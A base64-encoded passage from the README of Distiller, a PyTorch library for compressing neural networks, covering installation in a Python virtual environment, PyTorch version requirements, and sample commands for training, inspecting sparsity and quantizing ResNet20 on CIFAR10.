Lmh0bWwpIHRvIHBsYW4gZXhwZXJpbWVudHMgYW5kIGFuYWx5emUgY29tcHJl
c3Npb24gcmVzdWx0cy4gIFRoZSBncmFwaHMgYW5kIHZpc3VhbGl6YXRpb25z
IHlvdSBzZWUgb24gdGhpcyBwYWdlIG9yaWdpbmF0ZSBmcm9tIHRoZSBpbmNs
dWRlZCBKdXB5dGVyIG5vdGVib29rcy4gIAogICsgVGFrZSBhIGxvb2sgYXQg
W3RoaXMgbm90ZWJvb2tdKGh0dHBzOi8vZ2l0aHViLmNvbS9OZXJ2YW5hU3lz
dGVtcy9kaXN0aWxsZXIvYmxvYi9tYXN0ZXIvanVweXRlci9hbGV4bmV0X2lu
c2lnaHRzLmlweW5iKSwgd2hpY2ggY29tcGFyZXMgdmlzdWFsIGFzcGVjdHMg
b2YgZGVuc2UgYW5kIHNwYXJzZSBBbGV4bmV0IG1vZGVscy4KICArIFtUaGlz
IG5vdGVib29rXShodHRwczovL2dpdGh1Yi5jb20vTmVydmFuYVN5c3RlbXMv
ZGlzdGlsbGVyL2Jsb2IvbWFzdGVyL2p1cHl0ZXIvbW9kZWxfc3VtbWFyeS5p
cHluYikgY3JlYXRlcyBwZXJmb3JtYW5jZSBpbmRpY2F0b3IgZ3JhcGhzIGZy
b20gbW9kZWwgZGF0YS4KKiBTYW1wbGUgaW1wbGVtZW50YXRpb25zIG9mIHB1
Ymxpc2hlZCByZXNlYXJjaCBwYXBlcnMsIHVzaW5nIGxpYnJhcnktcHJvdmlk
ZWQgYnVpbGRpbmcgYmxvY2tzLiAgU2VlIHRoZSAgcmVzZWFyY2ggcGFwZXJz
IGRpc2N1c3Npb25zIGluIG91ciBbbW9kZWwtem9vXShodHRwczovL25lcnZh
bmFzeXN0ZW1zLmdpdGh1Yi5pby9kaXN0aWxsZXIvbW9kZWxfem9vLmh0bWwp
LgoqIExvZ2dpbmcgdG8gdGhlIGNvbnNvbGUsIHRleHQgZmlsZSBhbmQgVGVu
c29yQm9hcmQtZm9ybWF0dGVkIGZpbGUuCiogRXhwb3J0IHRvICoqT05OWCoq
IChleHBvcnQgb2YgcXVhbnRpemVkIG1vZGVscyBwZW5kaW5nIE9OTlggc3Rh
bmRhcmRpemF0aW9uKQoKIyMgSW5zdGFsbGF0aW9uCgpUaGVzZSBpbnN0cnVj
dGlvbnMgd2lsbCBoZWxwIGdldCBEaXN0aWxsZXIgdXAgYW5kIHJ1bm5pbmcg
b24geW91ciBsb2NhbCBtYWNoaW5lLgoxLiBbQ2xvbmUgRGlzdGlsbGVyXSgj
Y2xvbmUtZGlzdGlsbGVyKQoyLiBbQ3JlYXRlIGEgUHl0aG9uIHZpcnR1YWwg
ZW52aXJvbm1lbnRdKCNjcmVhdGUtYS1weXRob24tdmlydHVhbC1lbnZpcm9u
bWVudCkKMy4gW0luc3RhbGwgdGhlIHBhY2thZ2VdKCNpbnN0YWxsLXRoZS1w
YWNrYWdlKQoKTm90ZXM6Ci0gRGlzdGlsbGVyIGhhcyBvbmx5IGJlZW4gdGVz
dGVkIG9uIFVidW50dSAxNi4wNCBMVFMsIGFuZCB3aXRoIFB5dGhvbiAzLjUu
Ci0gSWYgeW91IGFyZSBub3QgdXNpbmcgYSBHUFUsIHlvdSBtaWdodCBuZWVk
IHRvIG1ha2Ugc21hbGwgYWRqdXN0bWVudHMgdG8gdGhlIGNvZGUuCgojIyMg
Q2xvbmUgRGlzdGlsbGVyCkNsb25lIHRoZSBEaXN0aWxsZXIgY29kZSByZXBv
c2l0b3J5IGZyb20gZ2l0aHViOgpgYGAKJCBnaXQgY2xvbmUgaHR0cHM6Ly9n
aXRodWIuY29tL05lcnZhbmFTeXN0ZW1zL2Rpc3RpbGxlci5naXQKYGBgClRo
ZSByZXN0IG9mIHRoZSBkb2N1bWVudGF0aW9uIHRoYXQgZm9sbG93cywgYXNz
dW1lcyB0aGF0IHlvdSBoYXZlIGNsb25lZCB5b3VyIHJlcG9zaXRvcnkgdG8g
YSBkaXJlY3RvcnkgY2FsbGVkIGBgYGRpc3RpbGxlcmBgYC4gPGJyPgoKIyMj
IENyZWF0ZSBhIFB5dGhvbiB2aXJ0dWFsIGVudmlyb25tZW50CldlIHJlY29t
bWVuZCB1c2luZyBhIFtQeXRob24gdmlydHVhbCBlbnZpcm9ubWVudF0oaHR0
cHM6Ly9kb2NzLnB5dGhvbi5vcmcvMy9saWJyYXJ5L3ZlbnYuaHRtbCN2ZW52
LWRlZiksIGJ1dCB0aGF0IG9mIGNvdXJzZSwgaXMgdXAgdG8geW91LgpUaGVy
ZSdzIG5vdGhpbmcgc3BlY2lhbCBhYm91dCB1c2luZyBEaXN0aWxsZXIgaW4g
YSB2aXJ0dWFsIGVudmlyb25tZW50LCBidXQgd2UgcHJvdmlkZSBzb21lIGlu
c3RydWN0aW9ucywgZm9yIGNvbXBsZXRlbmVzcy48YnI+CkJlZm9yZSBjcmVh
dGluZyB0aGUgdmlydHVhbCBlbnZpcm9ubWVudCwgbWFrZSBzdXJlIHlvdSBh
cmUgbG9jYXRlZCBpbiBkaXJlY3RvcnkgYGBgZGlzdGlsbGVyYGBgLiAgQWZ0
ZXIgY3JlYXRpbmcgdGhlIGVudmlyb25tZW50LCB5b3Ugc2hvdWxkIHNlZSBh
IGRpcmVjdG9yeSBjYWxsZWQgYGBgZGlzdGlsbGVyL2VudmBgYC4KPGJyPgoj
IyMjIFVzaW5nIHZpcnR1YWxlbnYKSWYgeW91IGRvbid0IGhhdmUgdmlydHVh
bGVudiBpbnN0YWxsZWQsIHlvdSBjYW4gZmluZCB0aGUgaW5zdGFsbGF0aW9u
IGluc3RydWN0aW9ucyBbaGVyZV0oaHR0cHM6Ly9wYWNrYWdpbmcucHl0aG9u
Lm9yZy9ndWlkZXMvaW5zdGFsbGluZy11c2luZy1waXAtYW5kLXZpcnR1YWxl
bnYvKS4KClRvIGNyZWF0ZSB0aGUgZW52aXJvbm1lbnQsIGV4ZWN1dGU6CmBg
YAokIHB5dGhvbjMgLW0gdmlydHVhbGVudiBlbnYKYGBgClRoaXMgY3JlYXRl
cyBhIHN1YmRpcmVjdG9yeSBuYW1lZCBgYGBlbnZgYGAgd2hlcmUgdGhlIHB5
dGhvbiB2aXJ0dWFsIGVudmlyb25tZW50IGlzIHN0b3JlZCwgYW5kIGNvbmZp
Z3VyZXMgdGhlIGN1cnJlbnQgc2hlbGwgdG8gdXNlIGl0IGFzIHRoZSBkZWZh
dWx0IHB5dGhvbiBlbnZpcm9ubWVudC4KCiMjIyMgVXNpbmcgdmVudgpJZiB5
b3UgcHJlZmVyIHRvIHVzZSBgYGB2ZW52YGBgLCB0aGVuIGJlZ2luIGJ5IGlu
c3RhbGxpbmcgaXQ6CmBgYAokIHN1ZG8gYXB0LWdldCBpbnN0YWxsIHB5dGhv
bjMtdmVudgpgYGAKVGhlbiBjcmVhdGUgdGhlIGVudmlyb25tZW50OgpgYGAK
JCBweXRob24zIC1tIHZlbnYgZW52CmBgYApBcyB3aXRoIHZpcnR1YWxlbnYs
IHRoaXMgY3JlYXRlcyBhIGRpcmVjdG9yeSBjYWxsZWQgYGBgZGlzdGlsbGVy
L2VudmBgYC48YnI+CgojIyMjIEFjdGl2YXRlIHRoZSBlbnZpcm9ubWVudApU
aGUgZW52aXJvbm1lbnQgYWN0aXZhdGlvbiBhbmQgZGVhY3RpdmF0aW9uIGNv
bW1hbmRzIGZvciBgYGB2ZW52YGBgIGFuZCBgYGB2aXJ0dWFsZW52YGBgIGFy
ZSB0aGUgc2FtZS48YnI+CioqIU5PVEU6IE1ha2Ugc3VyZSB0byBhY3RpdmF0
ZSB0aGUgZW52aXJvbm1lbnQsIGJlZm9yZSBwcm9jZWVkaW5nIHdpdGggdGhl
IGluc3RhbGxhdGlvbiBvZiB0aGUgZGVwZW5kZW5jeSBwYWNrYWdlczo8YnI+
KioKYGBgCiQgc291cmNlIGVudi9iaW4vYWN0aXZhdGUKYGBgCgojIyMgSW5z
dGFsbCB0aGUgcGFja2FnZQoKRmluYWxseSwgaW5zdGFsbCB0aGUgRGlzdGls
bGVyIHBhY2thZ2UgYW5kIGl0cyBkZXBlbmRlbmNpZXMgdXNpbmcgYGBgcGlw
M2BgYDoKYGBgCiQgY2QgZGlzdGlsbGVyCiQgcGlwMyBpbnN0YWxsIC1lIC4K
YGBgClRoaXMgaW5zdGFsbHMgRGlzdGlsbGVyIGluICJkZXZlbG9wbWVudCBt
b2RlIiwgbWVhbmluZyBhbnkgY2hhbmdlcyBtYWRlIGluIHRoZSBjb2RlIGFy
ZSByZWZsZWN0ZWQgaW4gdGhlIGVudmlyb25tZW50IHdpdGhvdXQgcmUtcnVu
bmluZyB0aGUgaW5zdGFsbCBjb21tYW5kIChzbyBubyBuZWVkIHRvIHJlLWlu
c3RhbGwgYWZ0ZXIgcHVsbGluZyBjaGFuZ2VzIGZyb20gdGhlIEdpdCByZXBv
c2l0b3J5KS4KCiMjIyBSZXF1aXJlZCBQeVRvcmNoIFZlcnNpb24KCkRpc3Rp
bGxlciBpcyB0ZXN0ZWQgdXNpbmcgdGhlIGRlZmF1bHQgaW5zdGFsbGF0aW9u
IG9mIFB5VG9yY2ggMS4zLjEsIHdoaWNoIHVzZXMgQ1VEQSAxMC4xLiBXZSB1
c2UgVG9yY2hWaXNpb24gdmVyc2lvbiAwLjQuMi4gVGhlc2UgYXJlIGluY2x1
ZGVkIGluIERpc3RpbGxlcidzIGByZXF1aXJlbWVudHMudHh0YCBhbmQgd2ls
bCBiZSBhdXRvbWF0aWNhbGx5IGluc3RhbGxlZCB3aGVuIGluc3RhbGxpbmcg
dGhlIERpc3RpbGxlciBwYWNrYWdlIGFzIGxpc3RlZCBhYm92ZS4KCklmIHlv
dSBkbyBub3QgdXNlIENVREEgMTAuMSBpbiB5b3VyIGVudmlyb25tZW50LCBw
bGVhc2UgcmVmZXIgdG8gW1B5VG9yY2ggd2Vic2l0ZV0oaHR0cHM6Ly9weXRv
cmNoLm9yZy9nZXQtc3RhcnRlZC9sb2NhbGx5LykgdG8gaW5zdGFsbCB0aGUg
Y29tcGF0aWJsZSBidWlsZCBvZiBQeVRvcmNoIDEuMy4xIGFuZCB0b3JjaHZp
c2lvbiAwLjQuMi4KCiMjIEdldHRpbmcgU3RhcnRlZAoKWW91IGNhbiBqdW1w
IGhlYWQtZmlyc3QgaW50byBzb21lIGxpbWl0ZWQgZXhhbXBsZXMgb2YgbmV0
d29yayBjb21wcmVzc2lvbiwgdG8gZ2V0IGEgZmVlbGluZyBmb3IgdGhlIGxp
YnJhcnkgd2l0aG91dCB0b28gbXVjaCBpbnZlc3RtZW50IG9uIHlvdXIgcGFy
dC4gIAoKRGlzdGlsbGVyIGNvbWVzIHdpdGggYSBzYW1wbGUgYXBwbGljYXRp
b24gZm9yIGNvbXByZXNzaW5nIGltYWdlIGNsYXNzaWZpY2F0aW9uIEROTnMs
IGBgYGNvbXByZXNzX2NsYXNzaWZpZXIucHlgYGAgbG9jYXRlZCBhdCBgYGBk
aXN0aWxsZXIvZXhhbXBsZXMvY2xhc3NpZmllcl9jb21wcmVzc2lvbmBgYC4K
CldlJ2xsIHNob3cgeW91IGhvdyB0byB1c2UgaXQgZm9yIHNvbWUgc2ltcGxl
IHVzZS1jYXNlcywgYW5kIHdpbGwgcG9pbnQgeW91IHRvIHNvbWUgcmVhZHkt
dG8tZ28gSnVweXRlciBub3RlYm9va3MuCgpGb3IgbW9yZSBkZXRhaWxzLCB0
aGVyZSBhcmUgc29tZSBvdGhlciByZXNvdXJjZXMgeW91IGNhbiByZWZlciB0
bzoKKyBbRnJlcXVlbnRseS1hc2tlZCBxdWVzdGlvbnMgKEZBUSldKGh0dHBz
Oi8vZ2l0aHViLmNvbS9OZXJ2YW5hU3lzdGVtcy9kaXN0aWxsZXIvd2lraS9G
cmVxdWVudGx5LUFza2VkLVF1ZXN0aW9ucy0oRkFRKSkKKyBbTW9kZWwgem9v
XShodHRwczovL25lcnZhbmFzeXN0ZW1zLmdpdGh1Yi5pby9kaXN0aWxsZXIv
bW9kZWxfem9vLmh0bWwpCisgW0NvbXByZXNzaW9uIHNjaGVkdWxpbmddKGh0
dHBzOi8vbmVydmFuYXN5c3RlbXMuZ2l0aHViLmlvL2Rpc3RpbGxlci9zY2hl
ZHVsZS5odG1sKQorIFtVc2FnZV0oaHR0cHM6Ly9uZXJ2YW5hc3lzdGVtcy5n
aXRodWIuaW8vZGlzdGlsbGVyL3VzYWdlLmh0bWwpCisgW1ByZXBhcmluZyBh
IG1vZGVsIGZvciBxdWFudGl6YXRpb25dKGh0dHBzOi8vbmVydmFuYXN5c3Rl
bXMuZ2l0aHViLmlvL2Rpc3RpbGxlci9wcmVwYXJlX21vZGVsX3F1YW50Lmh0
bWwpCisgW1R1dG9yaWFsOiBVc2luZyBEaXN0aWxsZXIgdG8gcHJ1bmUgYSBQ
eVRvcmNoIGxhbmd1YWdlIG1vZGVsXShodHRwczovL25lcnZhbmFzeXN0ZW1z
LmdpdGh1Yi5pby9kaXN0aWxsZXIvdHV0b3JpYWwtbGFuZ19tb2RlbC5odG1s
KQorIFtUdXRvcmlhbDogUHJ1bmluZyBGaWx0ZXJzICYgQ2hhbm5lbHNdKGh0
dHBzOi8vbmVydmFuYXN5c3RlbXMuZ2l0aHViLmlvL2Rpc3RpbGxlci90dXRv
cmlhbC1zdHJ1Y3RfcHJ1bmluZy5odG1sKQorIFtUdXRvcmlhbDogUG9zdC1U
cmFpbmluZyBRdWFudGl6YXRpb24gb2YgYSBMYW5ndWFnZSBNb2RlbF0oaHR0
cHM6Ly9uZXJ2YW5hc3lzdGVtcy5naXRodWIuaW8vZGlzdGlsbGVyL3R1dG9y
aWFsLWxhbmdfbW9kZWxfcXVhbnQuaHRtbCkKKyBbVHV0b3JpYWw6IFBvc3Qt
VHJhaW5pbmcgUXVhbnRpemF0aW9uIG9mIEdOTVQgKHRyYW5zbGF0aW9uIG1v
ZGVsKV0oaHR0cHM6Ly9uZXJ2YW5hc3lzdGVtcy5naXRodWIuaW8vZGlzdGls
bGVyL3R1dG9yaWFsLWdubXRfcXVhbnQuaHRtbCkKKyBbUG9zdC10cmFpbmlu
ZyBxdWFudGl6YXRpb24gY29tbWFuZCBsaW5lIGV4YW1wbGVzXShodHRwczov
L2dpdGh1Yi5jb20vTmVydmFuYVN5c3RlbXMvZGlzdGlsbGVyL2Jsb2IvbWFz
dGVyL2V4YW1wbGVzL3F1YW50aXphdGlvbi9wb3N0X3RyYWluX3F1YW50L2Nv
bW1hbmRfbGluZS5tZCkKCiMjIyBFeGFtcGxlIGludm9jYXRpb25zIG9mIHRo
ZSBzYW1wbGUgYXBwbGljYXRpb24KKyBbVHJhaW5pbmctb25seV0oI3RyYWlu
aW5nLW9ubHkpCisgW0dldHRpbmcgcGFyYW1ldGVyIHN0YXRpc3RpY3Mgb2Yg
YSBzcGFyc2lmaWVkIG1vZGVsXSgjZ2V0dGluZy1wYXJhbWV0ZXItc3RhdGlz
dGljcy1vZi1hLXNwYXJzaWZpZWQtbW9kZWwpCisgW1Bvc3QtdHJhaW5pbmcg
cXVhbnRpemF0aW9uXSgjcG9zdC10cmFpbmluZy1xdWFudGl6YXRpb24pCgoj
IyMjIFRyYWluaW5nLW9ubHkKVGhlIGZvbGxvd2luZyB3aWxsIGludm9rZSB0
cmFpbmluZy1vbmx5IChubyBjb21wcmVzc2lvbikgb2YgYSBuZXR3b3JrIG5h
bWVkICdzaW1wbGVuZXQnIG9uIHRoZSBDSUZBUjEwIGRhdGFzZXQuICBUaGlz
IGlzIHJvdWdobHkgYmFzZWQgb24gVG9yY2hWaXNpb24ncyBzYW1wbGUgSW1h
Z2VuZXQgdHJhaW5pbmcgYXBwbGljYXRpb24sIHNvIGl0IHNob3VsZCBsb29r
IGZhbWlsaWFyIGlmIHlvdSd2ZSB1c2VkIHRoYXQgYXBwbGljYXRpb24uICBJ
biAgdGhpcyBleGFtcGxlIHdlIGRvbid0IGludm9rZSBhbnkgY29tcHJlc3Np
b24gbWVjaGFuaXNtczogd2UganVzdCB0cmFpbiBiZWNhdXNlIGZvciBmaW5l
LXR1bmluZyBhZnRlciBwcnVuaW5nLCB0cmFpbmluZyBpcyBhbiBlc3NlbnRp
YWwgcGFydC48YnI+ICAKTm90ZSB0aGF0IHRoZSBmaXJzdCB0aW1lIHlvdSBl
eGVjdXRlIHRoaXMgY29tbWFuZCwgdGhlIENJRkFSMTAgY29kZSB3aWxsIGJl
IGRvd25sb2FkZWQgdG8geW91ciBtYWNoaW5lLCB3aGljaCBtYXkgdGFrZSBh
IGJpdCBvZiB0aW1lIC0gcGxlYXNlIGxldCB0aGUgZG93bmxvYWQgcHJvY2Vz
cyBwcm9jZWVkIHRvIGNvbXBsZXRpb24uCgpUaGUgcGF0aCB0byB0aGUgQ0lG
QVIxMCBkYXRhc2V0IGlzIGFyYml0cmFyeSwgYnV0IGluIG91ciBleGFtcGxl
cyB3ZSBwbGFjZSB0aGUgZGF0YXNldHMgaW4gdGhlIHNhbWUgZGlyZWN0b3J5
IGxldmVsIGFzIGRpc3RpbGxlciAoaS5lLiBgYGAuLi8uLi8uLi9kYXRhLmNp
ZmFyMTBgYGApLgoKRmlyc3QsIGNoYW5nZSB0byB0aGUgc2FtcGxlIGRpcmVj
dG9yeSwgdGhlbiBpbnZva2UgdGhlIGFwcGxpY2F0aW9uOgpgYGAKJCBjZCBk
aXN0aWxsZXIvZXhhbXBsZXMvY2xhc3NpZmllcl9jb21wcmVzc2lvbgokIHB5
dGhvbjMgY29tcHJlc3NfY2xhc3NpZmllci5weSAtLWFyY2ggc2ltcGxlbmV0
X2NpZmFyIC4uLy4uLy4uL2RhdGEuY2lmYXIxMCAtcCAzMCAtaj0xIC0tbHI9
MC4wMQpgYGAKCllvdSBjYW4gdXNlIGEgVGVuc29yQm9hcmQgYmFja2VuZCB0
byB2aWV3IHRoZSB0cmFpbmluZyBwcm9ncmVzcyAoaW4gdGhlIGRpYWdyYW0g
YmVsb3cgd2Ugc2hvdyBhIGNvdXBsZSBvZiB0cmFpbmluZyBzZXNzaW9ucyB3
aXRoIGRpZmZlcmVudCBMUiB2YWx1ZXMpLiAgRm9yIGNvbXByZXNzaW9uIHNl
c3Npb25zLCB3ZSd2ZSBhZGRlZCB0cmFjaW5nIG9mIGFjdGl2YXRpb24gYW5k
IHBhcmFtZXRlciBzcGFyc2l0eSBsZXZlbHMsIGFuZCByZWd1bGFyaXphdGlv
biBsb3NzLgo8Y2VudGVyPiA8aW1nIHNyYz0iaW1ncy9zaW1wbGVuZXRfdHJh
aW5pbmcucG5nIj48L2NlbnRlcj4KCgojIyMjIEdldHRpbmcgcGFyYW1ldGVy
IHN0YXRpc3RpY3Mgb2YgYSBzcGFyc2lmaWVkIG1vZGVsCldlJ3ZlIGluY2x1
ZGVkIGluIHRoZSBnaXQgcmVwb3NpdG9yeSBhIGZldyBjaGVja3BvaW50cyBv
ZiBhIFJlc05ldDIwIG1vZGVsIHRoYXQgd2UndmUgdHJhaW5lZCB3aXRoIDMy
LWJpdCBmbG9hdHMuICBMZXQncyBsb2FkIHRoZSBjaGVja3BvaW50IG9mIGEg
bW9kZWwgdGhhdCB3ZSd2ZSB0cmFpbmVkIHdpdGggY2hhbm5lbC13aXNlIEdy
b3VwIExhc3NvIHJlZ3VsYXJpemF0aW9uLjxicj4KV2l0aCB0aGUgZm9sbG93
aW5nIGNvbW1hbmQtbGluZSBhcmd1bWVudHMsIHRoZSBzYW1wbGUgYXBwbGlj
YXRpb24gbG9hZHMgdGhlIG1vZGVsIChgYGAtLXJlc3VtZWBgYCkgIGFuZCBw
cmludHMgc3RhdGlzdGljcyBhYm91dCB0aGUgbW9kZWwgd2VpZ2h0cyAoYGBg
LS1zdW1tYXJ5PXNwYXJzaXR5YGBgKS4gIFRoaXMgaXMgdXNlZnVsIGlmIHlv
dSB3YW50IHRvIGxvYWQgYSBwcmV2aW91c2x5IHBydW5lZCBtb2RlbCwgdG8g
ZXhhbWluZSB0aGUgd2VpZ2h0cyBzcGFyc2l0eSBzdGF0aXN0aWNzLCBmb3Ig
ZXhhbXBsZS4gIE5vdGUgdGhhdCB3aGVuIHlvdSAqcmVzdW1lKiBhIHN0b3Jl
ZCBjaGVja3BvaW50LCB5b3Ugc3RpbGwgbmVlZCB0byB0ZWxsIHRoZSBhcHBs
aWNhdGlvbiB3aGljaCBuZXR3b3JrIGFyY2hpdGVjdHVyZSB0aGUgY2hlY2tw
b2ludCB1c2VzIChgYGAtYT1yZXNuZXQyMF9jaWZhcmBgYCk6CmBgYAokIHB5
dGhvbjMgY29tcHJlc3NfY2xhc3NpZmllci5weSAtLXJlc3VtZT0uLi9zc2wv
Y2hlY2twb2ludHMvY2hlY2twb2ludF90cmFpbmVkX2NoX3JlZ3VsYXJpemVk
X2RlbnNlLnB0aC50YXIgLWE9cmVzbmV0MjBfY2lmYXIgLi4vLi4vLi4vZGF0
YS5jaWZhcjEwIC0tc3VtbWFyeT1zcGFyc2l0eQpgYGAKPGNlbnRlcj4gPGlt
ZyBzcmM9ImltZ3MvY2hfc3BhcnNpdHlfc3RhdHMucG5nIj48L2NlbnRlcj4K
CllvdSBzaG91bGQgc2VlIGEgdGV4dCB0YWJsZSBkZXRhaWxpbmcgdGhlIHZh
cmlvdXMgc3BhcnNpdGllcyBvZiB0aGUgcGFyYW1ldGVyIHRlbnNvcnMuICBU
aGUgZmlyc3QgY29sdW1uIGlzIHRoZSBwYXJhbWV0ZXIgbmFtZSwgZm9sbG93
ZWQgYnkgaXRzIHNoYXBlLCB0aGUgbnVtYmVyIG9mIG5vbi16ZXJvIGVsZW1l
bnRzIChOTlopIGluIHRoZSBkZW5zZSBtb2RlbCwgYW5kIGluIHRoZSBzcGFy
c2UgbW9kZWwuICBUaGUgbmV4dCBzZXQgb2YgY29sdW1ucyBzaG93IHRoZSBj
b2x1bW4td2lzZSwgcm93LXdpc2UsIGNoYW5uZWwtd2lzZSwga2VybmVsLXdp
c2UsIGZpbHRlci13aXNlIGFuZCBlbGVtZW50LXdpc2Ugc3BhcnNpdGllcy4K
PGJyPgpXcmFwcGluZyBpdCB1cCBhcmUgdGhlIHN0YW5kYXJkLWRldmlhdGlv
biwgbWVhbiwgYW5kIG1lYW4gb2YgYWJzb2x1dGUgdmFsdWVzIG9mIHRoZSBl
bGVtZW50cy4KCkluIHRoZSBbQ29tcHJlc3Npb24gSW5zaWdodHMgbm90ZWJv
b2tdKGh0dHBzOi8vZ2l0aHViLmNvbS9OZXJ2YW5hU3lzdGVtcy9kaXN0aWxs
ZXIvYmxvYi9tYXN0ZXIvanVweXRlci9jb21wcmVzc2lvbl9pbnNpZ2h0cy5p
cHluYikgd2UgdXNlIG1hdHBsb3RsaWIgdG8gcGxvdCBhIGJhciBjaGFydCBv
ZiB0aGlzIHN1bW1hcnksIHRoYXQgaW5kZWVkIHNob3cgbm9uLWltcHJlc3Np
dmUgZm9vdHByaW50IGNvbXByZXNzaW9uLgoKPGNlbnRlcj4gPGltZyBzcmM9
ImltZ3MvY2hfc3BhcnNpdHlfc3RhdHNfYmFyY2hhcnQucG5nIj48L2NlbnRl
cj4KCgpBbHRob3VnaCB0aGUgbWVtb3J5IGZvb3RwcmludCBjb21wcmVzc2lv
biBpcyB2ZXJ5IGxvdywgdGhpcyBtb2RlbCBhY3R1YWxseSBzYXZlcyAyNi42
JSBvZiB0aGUgTUFDcyBjb21wdXRlLiAgCmBgYAokIHB5dGhvbjMgY29tcHJl
c3NfY2xhc3NpZmllci5weSAtLXJlc3VtZT0uLi9zc2wvY2hlY2twb2ludHMv
Y2hlY2twb2ludF90cmFpbmVkX2NoYW5uZWxfcmVndWxhcml6ZWRfcmVzbmV0
MjBfZmluZXR1bmVkLnB0aC50YXIgLWE9cmVzbmV0MjBfY2lmYXIgLi4vLi4v
Li4vZGF0YS5jaWZhcjEwIC0tc3VtbWFyeT1jb21wdXRlCmBgYAo8Y2VudGVy
PiA8aW1nIHNyYz0iaW1ncy9jaF9jb21wdXRlX3N0YXRzLnBuZyI+PC9jZW50
ZXI+CgojIyMjIFBvc3QtdHJhaW5pbmcgcXVhbnRpemF0aW9uClRoaXMgZXhh
bXBsZSBwZXJmb3JtcyA4LWJpdCBxdWFudGl6YXRpb24gb2YgUmVzTmV0MjAg
Zm9yIENJRkFSMTAuICBXZSd2ZSBpbmNsdWRlZCBpbiB0aGUgZ2l0IHJlcG9z
aXRvcnkgdGhlIGNoZWNrcG9pbnQgb2YgYSBSZXNOZXQyMCBtb2RlbCB0aGF0
IHdlJ3ZlIHRyYWluZWQgd2l0aCAzMi1iaXQgZmxvYXRzLCBzbyB3ZSdsbCB0
YWtlIHRoaXMgbW9kZWwgYW5kIHF1YW50aXplIGl0OgoKYGBgCiQgcHl0aG9u
MyBjb21wcmVzc19jbGFzc2lmaWVyLnB5IC1hIHJlc25ldDIwX2NpZmFyIC4u
Ly4uLy4uL2RhdGEuY2lmYXIxMCAtLXJlc3VtZSAuLi9zc2wvY2hlY2twb2lu
dHMvY2hlY2twb2ludF90cmFpbmVkX2RlbnNlLnB0aC50YXIgLS1xdWFudGl6
ZS1ldmFsIC0tZXZhbHVhdGUKYGBgCgpUaGUgY29tbWFuZC1saW5lIGFib3Zl
IHdpbGwgc2F2ZSBhIGNoZWNrcG9pbnQgbmFtZWQgYHF1YW50aXplZF9jaGVj
a3BvaW50LnB0aC50YXJgIGNvbnRhaW5pbmcgdGhlIHF1YW50aXplZCBtb2Rl
bCBwYXJhbWV0ZXJzLiBTZWUgbW9yZSBleGFtcGxlcyBbaGVyZV0oaHR0cHM6
Ly9naXRodWIuY29tL05lcnZhbmFTeXN0ZW1zL2Rpc3RpbGxlci9ibG9iL21h
c3Rlci9leGFtcGxlcy9xdWFudGl6YXRpb24vcG9zdF90cmFpbl9xdWFudC9j
b21tYW5kX2xpbmUubWQpLgoKIyMjIEV4cGxvcmUgdGhlIHNhbXBsZSBKdXB5
dGVyIG5vdGVib29rcwpUaGUgc2V0IG9mIG5vdGVib29rcyB0aGF0IGNvbWUg
d2l0aCBEaXN0aWxsZXIgaXMgZGVzY3JpYmVkIFtoZXJlXShodHRwczovL25l
cnZhbmFzeXN0ZW1zLmdpdGh1Yi5pby9kaXN0aWxsZXIvanVweXRlci5odG1s
I3VzaW5nLXRoZS1kaXN0aWxsZXItbm90ZWJvb2tzKSwgd2hpY2ggYWxzbyBl
eHBsYWlucyB0aGUgc3RlcHMgdG8gaW5zdGFsbCB0aGUgSnVweXRlciBub3Rl
Ym9vayBzZXJ2ZXIuPGJyPgpBZnRlciBpbnN0YWxsaW5nIGFuZCBydW5uaW5n
IHRoZSBzZXJ2ZXIsIHRha2UgYSBsb29rIGF0IHRoZSBbbm90ZWJvb2tdKGh0
dHBzOi8vZ2l0aHViLmNvbS9OZXJ2YW5hU3lzdGVtcy9kaXN0aWxsZXIvYmxv
Yi9tYXN0ZXIvanVweXRlci9zZW5zaXRpdml0eV9hbmFseXNpcy5pcHluYikg
Y292ZXJpbmcgcHJ1bmluZyBzZW5zaXRpdml0eSBhbmFseXNpcy4KClNlbnNp
dGl2aXR5IGFuYWx5c2lzIGlzIGEgbG9uZyBwcm9jZXNzIGFuZCB0aGlzIG5v
dGVib29rIGxvYWRzIENTViBmaWxlcyB0aGF0IGFyZSB0aGUgb3V0cHV0IG9m
IHNldmVyYWwgc2Vzc2lvbnMgb2Ygc2Vuc2l0aXZpdHkgYW5hbHlzaXMuCjxj
ZW50ZXI+IDxpbWcgc3JjPSJpbWdzL3Jlc25ldDE4LXNlbnNpdGl2aXR5LnBu
ZyI+PC9jZW50ZXI+CgojIyBTZXQgdXAgdGhlIGNsYXNzaWZpY2F0aW9uIGRh
dGFzZXRzClRoZSBzYW1wbGUgYXBwbGljYXRpb24gZm9yIGNvbXByZXNzaW5n
IGltYWdlIGNsYXNzaWZpY2F0aW9uIEROTnMsIGBgYGNvbXByZXNzX2NsYXNz
aWZpZXIucHlgYGAgbG9jYXRlZCBhdCBgYGBkaXN0aWxsZXIvZXhhbXBsZXMv
Y2xhc3NpZmllcl9jb21wcmVzc2lvbmBgYCwgdXNlcyBib3RoIFtDSUZBUjEw
XShodHRwczovL3d3dy5jcy50b3JvbnRvLmVkdS9+a3Jpei9jaWZhci5odG1s
KSBhbmQgW0ltYWdlTmV0XShodHRwOi8vd3d3LmltYWdlLW5ldC5vcmcvKSBp
bWFnZSBkYXRhc2V0cy48YnI+CgpUaGUgYGBgY29tcHJlc3NfY2xhc3NpZmll
ci5weWBgYCBhcHBsaWNhdGlvbiB3aWxsIGRvd25sb2FkIHRoZSBDSUZBUjEw
IGF1dG9tYXRpY2FsbHkgdGhlIGZpcnN0IHRpbWUgeW91IHRyeSB0byB1c2Ug
aXQgKHRoYW5rcyB0byBUb3JjaFZpc2lvbikuICBUaGUgZXhhbXBsZSBpbnZv
Y2F0aW9ucyB1c2VkICB0aHJvdWdob3V0IERpc3RpbGxlcidzIGRvY3VtZW50
YXRpb24gYXNzdW1lIHRoYXQgeW91IGhhdmUgZG93bmxvYWRlZCB0aGUgaW1h
Z2VzIHRvIGRpcmVjdG9yeSBgYGBkaXN0aWxsZXIvLi4vZGF0YS5jaWZhcjEw
YGBgLCBidXQgeW91IGNhbiBwbGFjZSB0aGUgaW1hZ2VzIGFueXdoZXJlIHlv
dSB3YW50ICh5b3UgdGVsbCBgYGBjb21wcmVzc19jbGFzc2lmaWVyLnB5YGBg
IHdoZXJlIHRoZSBkYXRhc2V0IGlzIGxvY2F0ZWQgLSBvciB3aGVyZSB5b3Ug
d2FudCB0aGUgYXBwbGljYXRpb24gdG8gZG93bmxvYWQgdGhlIGRhdGFzZXQg
